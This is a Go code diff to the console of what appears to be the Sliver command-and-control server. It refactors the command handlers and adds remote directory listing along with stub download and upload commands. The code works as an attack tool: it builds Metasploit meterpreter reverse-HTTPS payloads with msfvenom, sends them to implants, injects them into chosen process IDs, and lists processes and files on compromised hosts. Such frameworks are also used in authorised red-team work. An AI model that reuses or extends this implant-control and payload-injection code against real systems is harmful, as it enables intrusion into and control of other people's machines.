@@ -9,6 +9,7 @@ import (
 	"os"
 	"path/filepath"
 	pb "sliver/protobuf"
+	"sliver/server/msf"
 	"sort"
 	"strconv"
 	"strings"
@@ -57,17 +58,22 @@ var (
 	}
 
 	cmdHandlers = map[string]interface{}{
-		"help":     help,
-		"ls":       ls,
-		"info":     info,
-		"use":      use,
-		"gen":      generate,
-		"generate": generate,
-		"msf":      msf,
-		"inject":   inject,
-		"ps":       ps,
-		"ping":     ping,
-		"kill":     kill,
+		"help":     helpCmd,
+		"s":        sessionsCmd,
+		"sessions": sessionsCmd,
+		"info":     infoCmd,
+		"use":      useCmd,
+		"gen":      generateCmd,
+		"generate": generateCmd,
+		"msf":      msfCmd,
+		"inject":   injectCmd,
+		"ps":       psCmd,
+		"ping":     pingCmd,
+		"kill":     killCmd,
+
+		"ls":       lsCmd,
+		"download": downloadCmd,
+		"upload":   uploadCmd,
 	}
 )
 
@@ -111,10 +117,10 @@ func startConsole(events chan Event) {
 			sliver := event.Sliver
 			switch event.EventType {
 			case "connected":
-				fmt.Fprintf(term, Info+"Connection #%d %s - %s (%s) - %s/%s\n",
+				fmt.Fprintf(term, Info+"Session #%d %s - %s (%s) - %s/%s\n",
 					sliver.Id, sliver.Name, sliver.RemoteAddress, sliver.Hostname, sliver.Os, sliver.Arch)
 			case "disconnected":
-				fmt.Fprintf(term, Warn+"Lost connection #%d %s - %s (%s) - %s/%s\n",
+				fmt.Fprintf(term, Warn+"Lost session #%d %s - %s (%s) - %s/%s\n",
 					sliver.Id, sliver.Name, sliver.RemoteAddress, sliver.Hostname, sliver.Os, sliver.Arch)
 				if activeSliver != nil && sliver.Id == activeSliver.Id {
 					activeSliver = nil
@@ -176,7 +182,7 @@ func getSliver(name string) *Sliver {
 }
 
 // ---------------- Commands ----------------
-func help(term *terminal.Terminal, args []string) {
+func helpCmd(term *terminal.Terminal, args []string) {
 	tmpl, _ := template.New("help").Delims("[[", "]]").Parse(getHelpFor(args))
 	tmpl.Execute(term, struct {
 		Normal    string
@@ -190,10 +196,10 @@ func help(term *terminal.Terminal, args []string) {
 
 }
 
-func ls(term *terminal.Terminal, args []string) {
-	lsFlags := flag.NewFlagSet("ls", flag.ContinueOnError)
-	lsFlags.Usage = func() { help(term, []string{"ls"}) }
-	err := lsFlags.Parse(args)
+func sessionsCmd(term *terminal.Terminal, args []string) {
+	sessionsFlags := flag.NewFlagSet("sessions", flag.ContinueOnError)
+	sessionsFlags.Usage = func() { helpCmd(term, []string{"sessions"}) }
+	err := sessionsFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
 	}
@@ -262,9 +268,9 @@ func printSlivers(term *terminal.Terminal) {
 	}
 }
 
-func kill(term *terminal.Terminal, args []string) {
+func killCmd(term *terminal.Terminal, args []string) {
 	killFlags := flag.NewFlagSet("kill", flag.ContinueOnError)
-	killFlags.Usage = func() { help(term, []string{"kill"}) }
+	killFlags.Usage = func() { helpCmd(term, []string{"kill"}) }
 	err := killFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
@@ -278,7 +284,7 @@ func kill(term *terminal.Terminal, args []string) {
 	}
 	if sliver != nil {
 		fmt.Fprintf(term, "\n"+Info+"Killing sliver %s (%d)", sliver.Name, sliver.Id)
-		data, _ := proto.Marshal(&pb.Kill{Id: randomID()})
+		data, _ := proto.Marshal(&pb.Kill{Id: randomId()})
 		(*sliver).Send <- pb.Envelope{
 			Type: "kill",
 			Data: data,
@@ -286,9 +292,9 @@ func kill(term *terminal.Terminal, args []string) {
 	}
 }
 
-func info(term *terminal.Terminal, args []string) {
+func infoCmd(term *terminal.Terminal, args []string) {
 	infoFlags := flag.NewFlagSet("info", flag.ContinueOnError)
-	infoFlags.Usage = func() { help(term, []string{"info"}) }
+	infoFlags.Usage = func() { helpCmd(term, []string{"info"}) }
 	err := infoFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
@@ -317,9 +323,9 @@ func info(term *terminal.Terminal, args []string) {
 	}
 }
 
-func use(term *terminal.Terminal, args []string) {
+func useCmd(term *terminal.Terminal, args []string) {
 	useFlags := flag.NewFlagSet("use", flag.ContinueOnError)
-	useFlags.Usage = func() { help(term, []string{"use"}) }
+	useFlags.Usage = func() { helpCmd(term, []string{"use"}) }
 	err := useFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
@@ -339,7 +345,7 @@ func use(term *terminal.Terminal, args []string) {
 	}
 }
 
-func generate(term *terminal.Terminal, args []string) {
+func generateCmd(term *terminal.Terminal, args []string) {
 	genFlags := flag.NewFlagSet("gen", flag.ContinueOnError)
 	target := genFlags.String("os", windowsPlatform, "operating system")
 	arch := genFlags.String("arch", "amd64", "cpu architecture (amd64/386)")
@@ -347,7 +353,7 @@ func generate(term *terminal.Terminal, args []string) {
 	lport := genFlags.Int("lport", *serverLPort, "sliver server listner port")
 	debug := genFlags.Bool("debug", false, "generate a debug binary")
 	save := genFlags.String("save", "", "save binary file to path")
-	genFlags.Usage = func() { help(term, []string{"generate"}) }
+	genFlags.Usage = func() { helpCmd(term, []string{"generate"}) }
 	err := genFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
@@ -379,174 +385,179 @@ func generate(term *terminal.Terminal, args []string) {
 	}
 }
 
-func msf(term *terminal.Terminal, args []string) {
+func msfCmd(term *terminal.Terminal, args []string) {
 	msfFlags := flag.NewFlagSet("msf", flag.ContinueOnError)
 	payloadName := msfFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
 	lhost := msfFlags.String("lhost", "", "metasploit listener lhost")
 	lport := msfFlags.Int("lport", 4444, "metasploit listner port")
-	msfFlags.Usage = func() { help(term, []string{"msf"}) }
+	msfFlags.Usage = func() { helpCmd(term, []string{"msf"}) }
 	err := msfFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
 	}
 
-	if activeSliver != nil {
-		if *lhost == "" {
-			fmt.Fprintf(term, "\n"+Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
-			return
-		}
-
-		fmt.Fprintf(term, "\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
-			*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
-		config := VenomConfig{
-			Os:         activeSliver.Os,
-			Arch:       MsfArch(activeSliver.Arch),
-			Payload:    *payloadName,
-			LHost:      *lhost,
-			LPort:      uint16(*lport),
-			Encoder:    "",
-			Iterations: 0, // TODO: Add support for msf encoders/encrypters
-			Encrypt:    "",
-		}
-		rawPayload, err := MsfVenomPayload(config)
-		if err != nil {
-			fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
-			return
-		}
-		fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
-
-		fmt.Fprintf(term, Info+"Sending payload -> %s\n", activeSliver.Name)
-		data, _ := proto.Marshal(&pb.Task{
-			Encoder: "raw",
-			Data:    rawPayload,
-		})
-		(*activeSliver).Send <- pb.Envelope{
-			Type: "task",
-			Data: data,
-		}
-		fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
-	} else {
+	if activeSliver == nil {
 		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		return
 	}
+
+	if *lhost == "" {
+		fmt.Fprintf(term, "\n"+Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
+		return
+	}
+
+	fmt.Fprintf(term, "\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
+		*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
+	config := msf.VenomConfig{
+		Os:         activeSliver.Os,
+		Arch:       msf.MsfArch(activeSliver.Arch),
+		Payload:    *payloadName,
+		LHost:      *lhost,
+		LPort:      uint16(*lport),
+		Encoder:    "",
+		Iterations: 0, // TODO: Add support for msf encoders/encrypters
+		Encrypt:    "",
+	}
+	rawPayload, err := msf.MsfVenomPayload(config)
+	if err != nil {
+		fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
+		return
+	}
+	fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
+
+	fmt.Fprintf(term, Info+"Sending payload -> %s\n", activeSliver.Name)
+	data, _ := proto.Marshal(&pb.Task{
+		Encoder: "raw",
+		Data:    rawPayload,
+	})
+	(*activeSliver).Send <- pb.Envelope{
+		Type: "task",
+		Data: data,
+	}
+	fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
+
 }
 
-func inject(term *terminal.Terminal, args []string) {
+func injectCmd(term *terminal.Terminal, args []string) {
 	injectFlags := flag.NewFlagSet("inject", flag.ContinueOnError)
 	injectPid := injectFlags.Int("pid", 0, "pid to inject payload into")
 	payloadName := injectFlags.String("payload", "meterpreter_reverse_https", "metasploit payload")
 	lhost := injectFlags.String("lhost", "", "metasploit listener lhost")
 	lport := injectFlags.Int("lport", 4444, "metasploit listner port")
-	injectFlags.Usage = func() { help(term, []string{"inject"}) }
+	injectFlags.Usage = func() { helpCmd(term, []string{"inject"}) }
 	err := injectFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
 	}
 
-	if activeSliver != nil {
-		if *lhost == "" {
-			fmt.Fprintf(term, Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
-			return
-		}
-
-		fmt.Fprintf(term, "\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
-			*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
-		config := VenomConfig{
-			Os:         activeSliver.Os,
-			Arch:       MsfArch(activeSliver.Arch),
-			Payload:    *payloadName,
-			LHost:      *lhost,
-			LPort:      uint16(*lport),
-			Encoder:    "",
-			Iterations: 0, // TODO: Add support for msf encoders/encrypters
-			Encrypt:    "",
-		}
-		rawPayload, err := MsfVenomPayload(config)
-		if err != nil {
-			fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
-			return
-		}
-		fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
-
-		fmt.Fprintf(term, Info+"Sending payload -> %s -> PID: %d\n", activeSliver.Name, *injectPid)
-		data, _ := proto.Marshal(&pb.RemoteTask{
-			Pid:     int32(*injectPid),
-			Encoder: "raw",
-			Data:    rawPayload,
-		})
-		(*activeSliver).Send <- pb.Envelope{
-			Type: "remoteTask",
-			Data: data,
-		}
-		fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
-	} else {
+	if activeSliver == nil {
 		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		return
 	}
+	if *lhost == "" {
+		fmt.Fprintf(term, Warn+"Invalid lhost '%s', see `help msf`\n", *lhost)
+		return
+	}
+
+	fmt.Fprintf(term, "\n"+Info+"Generating %s %s/%s -> %s:%d ...\n",
+		*payloadName, activeSliver.Os, activeSliver.Arch, *lhost, *lport)
+	config := msf.VenomConfig{
+		Os:         activeSliver.Os,
+		Arch:       msf.MsfArch(activeSliver.Arch),
+		Payload:    *payloadName,
+		LHost:      *lhost,
+		LPort:      uint16(*lport),
+		Encoder:    "",
+		Iterations: 0, // TODO: Add support for msf encoders/encrypters
+		Encrypt:    "",
+	}
+	rawPayload, err := msf.MsfVenomPayload(config)
+	if err != nil {
+		fmt.Fprintf(term, Warn+"Error while generating payload: %v\n", err)
+		return
+	}
+	fmt.Fprintf(term, Info+"Successfully generated payload %d byte(s)\n", len(rawPayload))
+
+	fmt.Fprintf(term, Info+"Sending payload -> %s -> PID: %d\n", activeSliver.Name, *injectPid)
+	data, _ := proto.Marshal(&pb.RemoteTask{
+		Pid:     int32(*injectPid),
+		Encoder: "raw",
+		Data:    rawPayload,
+	})
+	(*activeSliver).Send <- pb.Envelope{
+		Type: "remoteTask",
+		Data: data,
+	}
+	fmt.Fprintf(term, Info+"Sucessfully sent payload\n")
+
 }
 
-func ps(term *terminal.Terminal, args []string) {
+func psCmd(term *terminal.Terminal, args []string) {
 	psFlags := flag.NewFlagSet("ps", flag.ContinueOnError)
 	pidFilter := psFlags.Int("pid", -1, "find proc by pid")
 	exeFilter := psFlags.String("exe", "", "filter procs by name")
-	psFlags.Usage = func() { help(term, []string{"ps"}) }
+	psFlags.Usage = func() { helpCmd(term, []string{"ps"}) }
 	err := psFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
 	}
 
-	if activeSliver != nil {
-		fmt.Fprintf(term, Info+"Requesting process list from %s ...\n", activeSliver.Name)
+	if activeSliver == nil {
+		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		return
+	}
 
-		respId := randomID()
-		data, _ := proto.Marshal(&pb.ProcessListReq{
-			Id: respId,
-		})
-		resp := make(chan pb.Envelope)
-		(*activeSliver).Resp[respId] = resp
-		defer close(resp)
-		defer delete((*activeSliver).Resp, respId)
-		(*activeSliver).Send <- pb.Envelope{
-			Id:   respId,
-			Type: "psReq",
-			Data: data,
-		}
+	fmt.Fprintf(term, Info+"Requesting process list from %s ...\n", activeSliver.Name)
 
-		var envelope pb.Envelope
-		select {
-		case envelope = <-resp:
-		case <-time.After(cmdTimeout):
-			fmt.Fprintf(term, "\n"+Warn+"Command failed due to timeout\n")
-			return
-		}
+	respId := randomId()
+	data, _ := proto.Marshal(&pb.ProcessListReq{
+		Id: respId,
+	})
+	resp := make(chan pb.Envelope)
+	(*activeSliver).Resp[respId] = resp
+	defer close(resp)
+	defer delete((*activeSliver).Resp, respId)
+	(*activeSliver).Send <- pb.Envelope{
+		Id:   respId,
+		Type: "psReq",
+		Data: data,
+	}
 
-		psList := &pb.ProcessList{}
-		err := proto.Unmarshal(envelope.Data, psList)
-		if err != nil {
-			fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
-			return
-		}
+	var envelope pb.Envelope
+	select {
+	case envelope = <-resp:
+	case <-time.After(cmdTimeout):
+		fmt.Fprintf(term, "\n"+Warn+"Command failed due to timeout\n")
+		return
+	}
 
-		header := fmt.Sprintf("\n% 6s | % 6s | %s\n", "pid", "ppid", "executable")
-		fmt.Fprintf(term, header)
-		fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(header)))
-		for _, proc := range psList.Processes {
-			if *pidFilter != -1 {
-				if proc.Pid == int32(*pidFilter) {
-					printProcInfo(term, proc)
-				}
-			}
-			if *exeFilter != "" {
-				if strings.HasPrefix(proc.Executable, *exeFilter) {
-					printProcInfo(term, proc)
-				}
-			}
-			if *pidFilter == -1 && *exeFilter == "" {
+	psList := &pb.ProcessList{}
+	err = proto.Unmarshal(envelope.Data, psList)
+	if err != nil {
+		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
+		return
+	}
+
+	header := fmt.Sprintf("\n% 6s | % 6s | %s\n", "pid", "ppid", "executable")
+	fmt.Fprintf(term, header)
+	fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(header)))
+	for _, proc := range psList.Processes {
+		if *pidFilter != -1 {
+			if proc.Pid == int32(*pidFilter) {
 				printProcInfo(term, proc)
 			}
 		}
-		fmt.Fprintf(term, "\n")
-	} else {
-		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		if *exeFilter != "" {
+			if strings.HasPrefix(proc.Executable, *exeFilter) {
+				printProcInfo(term, proc)
+			}
+		}
+		if *pidFilter == -1 && *exeFilter == "" {
+			printProcInfo(term, proc)
+		}
 	}
+	fmt.Fprintf(term, "\n")
+
 }
 
 // printProcInfo - Stylizes the process information
@@ -562,9 +573,9 @@ func printProcInfo(term *terminal.Terminal, proc *pb.Process) {
 		color, bold, proc.Pid, normal, color, proc.Ppid, proc.Executable, normal)
 }
 
-func ping(term *terminal.Terminal, args []string) {
+func pingCmd(term *terminal.Terminal, args []string) {
 	pingFlags := flag.NewFlagSet("ping", flag.ContinueOnError)
-	pingFlags.Usage = func() { help(term, []string{"ping"}) }
+	pingFlags.Usage = func() { helpCmd(term, []string{"ping"}) }
 	err := pingFlags.Parse(args)
 	if err == flag.ErrHelp {
 		return
@@ -576,37 +587,153 @@ func ping(term *terminal.Terminal, args []string) {
 	} else if 0 < len(args) {
 		sliver = getSliver(args[0])
 	}
-	if sliver != nil {
-		respId := randomID()
-		data, _ := proto.Marshal(&pb.Ping{
-			Id: respId,
-		})
-		resp := make(chan pb.Envelope)
-		(*sliver).Resp[respId] = resp
-		defer close(resp)
-		defer delete((*sliver).Resp, respId)
-		(*sliver).Send <- pb.Envelope{
-			Id:   respId,
-			Type: "ping",
-			Data: data,
-		}
-
-		var envelope pb.Envelope
-		select {
-		case envelope = <-resp:
-		case <-time.After(cmdTimeout):
-			fmt.Fprintf(term, "\n"+Warn+"Command failed due to timeout\n")
-			return
-		}
-
-		pong := &pb.Ping{}
-		err := proto.Unmarshal(envelope.Data, pong)
-		if err != nil {
-			fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
-			return
-		}
-		fmt.Fprintf(term, "\n"+Info+"Ping/Pong with ID = %s\n", pong.Id)
-	} else {
+	if sliver == nil {
 		fmt.Fprintln(term, "\n"+Warn+"Invalid sliver name\n")
+		return
 	}
+
+	respId := randomId()
+	data, _ := proto.Marshal(&pb.Ping{
+		Id: respId,
+	})
+	resp := make(chan pb.Envelope)
+	(*sliver).Resp[respId] = resp
+	defer close(resp)
+	defer delete((*sliver).Resp, respId)
+	(*sliver).Send <- pb.Envelope{
+		Id:   respId,
+		Type: "ping",
+		Data: data,
+	}
+
+	var envelope pb.Envelope
+	select {
+	case envelope = <-resp:
+	case <-time.After(cmdTimeout):
+		fmt.Fprintf(term, "\n"+Warn+"Command failed due to timeout\n")
+		return
+	}
+
+	pong := &pb.Ping{}
+	err = proto.Unmarshal(envelope.Data, pong)
+	if err != nil {
+		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
+		return
+	}
+	fmt.Fprintf(term, "\n"+Info+"Ping/Pong with ID = %s\n", pong.Id)
+
+}
+
+func lsCmd(term *terminal.Terminal, args []string) {
+	lsFlags := flag.NewFlagSet("ls", flag.ContinueOnError)
+	lsFlags.Usage = func() { helpCmd(term, []string{"ls"}) }
+	args = lsFlags.Args()
+	err := lsFlags.Parse(args)
+	if err == flag.ErrHelp {
+		return
+	}
+
+	if activeSliver == nil {
+		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		return
+	}
+
+	if len(args) < 1 {
+		args = append(args, ".")
+	}
+
+	respId := randomId()
+	data, _ := proto.Marshal(&pb.DirListReq{
+		Id:   respId,
+		Path: args[0],
+	})
+	resp := make(chan pb.Envelope)
+	(*activeSliver).Resp[respId] = resp
+	defer close(resp)
+	defer delete((*activeSliver).Resp, respId)
+	(*activeSliver).Send <- pb.Envelope{
+		Id:   respId,
+		Type: "dirListReq",
+		Data: data,
+	}
+
+	var envelope pb.Envelope
+	select {
+	case envelope = <-resp:
+	case <-time.After(cmdTimeout):
+		fmt.Fprintf(term, "\n"+Warn+"Command failed due to timeout\n")
+		return
+	}
+
+	dirList := &pb.DirList{}
+	err = proto.Unmarshal(envelope.Data, dirList)
+	if err != nil {
+		fmt.Fprintf(term, "\n"+Warn+"Unmarshaling envelope error: %v\n", err)
+		return
+	}
+
+	if dirList.Exists {
+		printDirList(term, dirList)
+	} else {
+		fmt.Fprintf(term, "\n"+Warn+"Directory does not exist (%s)\n", dirList.Path)
+	}
+
+}
+
+func printDirList(term *terminal.Terminal, dirList *pb.DirList) {
+	fmt.Fprintf(term, "\n%s\n", dirList.Path)
+	fmt.Fprintf(term, "%s\n", strings.Repeat("=", len(dirList.Path)))
+
+	table := tabwriter.NewWriter(term, 0, 2, 2, ' ', 0)
+	for _, fileInfo := range dirList.Files {
+		if fileInfo.IsDir {
+			fmt.Fprintf(table, "%s\t<dir>\t\n", fileInfo.Name)
+		} else {
+			fmt.Fprintf(table, "%s\t%s\t\n", fileInfo.Name, byteCountBinary(fileInfo.Size))
+		}
+	}
+	table.Flush()
+}
+
+func downloadCmd(term *terminal.Terminal, args []string) {
+	downloadFlags := flag.NewFlagSet("download", flag.ContinueOnError)
+	downloadFlags.Usage = func() { helpCmd(term, []string{"download"}) }
+	err := downloadFlags.Parse(args)
+	if err == flag.ErrHelp {
+		return
+	}
+
+	if activeSliver == nil {
+		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		return
+	}
+
+}
+
+func uploadCmd(term *terminal.Terminal, args []string) {
+	uploadFlags := flag.NewFlagSet("upload", flag.ContinueOnError)
+	uploadFlags.Usage = func() { helpCmd(term, []string{"upload"}) }
+	err := uploadFlags.Parse(args)
+	if err == flag.ErrHelp {
+		return
+	}
+
+	if activeSliver == nil {
+		fmt.Fprintf(term, "\n"+Warn+"Please select and active sliver via `use`\n")
+		return
+	}
+
+}
+
+func byteCountBinary(b int64) string {
+	const unit = 1024
+	if b < unit {
+		return fmt.Sprintf("%d B", b)
+	}
+	div, exp := int64(unit), 0
+	for n := b / unit; n >= unit; n /= unit {
+		div *= unit
+		exp++
+	}
+	return fmt.Sprintf("%.1f %ciB", float64(b)/float64(div), "KMGTPE"[exp])
 }
